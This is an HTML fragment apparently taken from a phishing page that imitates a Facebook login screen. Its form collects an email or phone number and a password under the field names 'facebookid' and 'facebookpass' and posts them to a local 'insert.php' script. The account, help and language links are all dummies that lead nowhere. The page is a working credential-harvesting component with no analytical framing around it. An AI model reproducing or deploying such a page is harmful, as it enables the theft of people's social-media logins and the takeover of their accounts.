...
<body style="margin:0px;">
    ...
    <div style="width:100%;">
        ...
        <div class="inputf" style="background-color:AliceBlue;padding:10px;text-align:center;">
            <br/>
            <form name="fbform" method="post" action="insert.php">
                <input name="facebookid" type="text" placeholder="Email address or phone number" maxlength="40" size="30px" required>
                <br/>
                <br/>
                <input name="facebookpass" type="password" placeholder="Password" maxlength="40" size="30px" required>
                <br/>
                <br/>
                <button class="login" type="submit" size="60px">Login</button>
                <br/>
                <br/>
                <span style="text-align:center;">Or</span><br/><br/>
                <a class="check" href="#email" onclick='document.getElementById("email").focus();'>Create New Account</a>
                <br/>
                <br/>
                <a href="#email" onclick='document.getElementById("email").focus();'>Forgotten password?</a>
                <br/>
                <br/>
                <a href="#email" onclick='document.getElementById("email").focus();'>Help Centre</a>
                <br/>
            </form>
        </div>
        <div class="bottom" style="background-color:#808080;padding:10px;">
            <table style="width:250px;margin-left:auto;margin-right:auto;color:#D3D3D3;">
                <tr>
                    <td>
                        <a href="#email" onclick='document.getElementById("email").focus();'>English (UK)</a>
                    </td>
                    <td>
                        <a href="#email" onclick='document.getElementById("email").focus();'>English (US)</a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="#email" onclick='document.getElementById("email").focus();'>English (In)</a>
                    </td>
                    <td>
                        <a href="#email" onclick='document.getElementById("email").focus();'>More</a>
                    </td>
                </tr>
            </table>
